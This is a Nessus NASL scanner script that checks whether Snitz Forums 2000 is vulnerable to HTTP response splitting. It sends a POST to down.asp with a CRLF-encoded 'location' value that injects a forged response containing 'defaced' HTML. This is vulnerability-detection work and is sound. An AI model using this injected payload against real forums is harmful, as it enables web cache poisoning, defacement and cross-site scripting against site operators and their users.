#
# Script by Noam Rathaus
#
# "Maestro De-Seguridad" <maestrodeseguridad@lycos.com>
# ADVISORY: security hole (http response splitting) in snitz forums 2000
# 2004-09-16 18:00

if(description)
{
 script_id(14783);
 script_version("$Revision: 1.4 $");
 script_cve_id("CAN-2004-1687");
 script_bugtraq_id(11201);
 
 name["english"] = "Snitz Forums 2000 HTTP Response Splitting";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is using Snitz Forums 2000 - an ASP based forum/bbs.

There is a bug in this software which makes it vulnerable to HTTP response 
splitting vulnerability.

An attacker may use this bug to preform web cache poisoning, xss attack, etc.

Solution : Upgrade to the latest version of this software.
Risk factor: Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of an HTTP Response Splitting";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");
 family["english"] = "CGI abuses : XSS";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "cross_site_scripting.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);
if (  get_kb_item(string("www/", port, "/generic_xss")) ) exit(0);


function check(loc)
{
 req = string("POST ", loc, "/down.asp HTTP/1.1\r\n",
 "Content-Type: application/x-www-form-urlencoded\r\n",
 "Host: ", get_host_name(), ":", port, "\r\n",
 "Content-length: 134\r\n",
 "\r\n",
 "location=/foo?%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Length:%2014%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{html}defaced{/html}");
 
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(string("HTTP/1.0 200 OK\r\nContent-Length: 14\r\nContent-Type: text/html\r\n\r\n{html}defaced{/html}\r\nContent-Length: ") >< r)
 {
  security_warning(port);
  exit(0);
 }
}

check(loc:"/");

foreach dir (make_list("/forum", "/forums", cgi_dirs()))
{
 check(loc:dir);
}
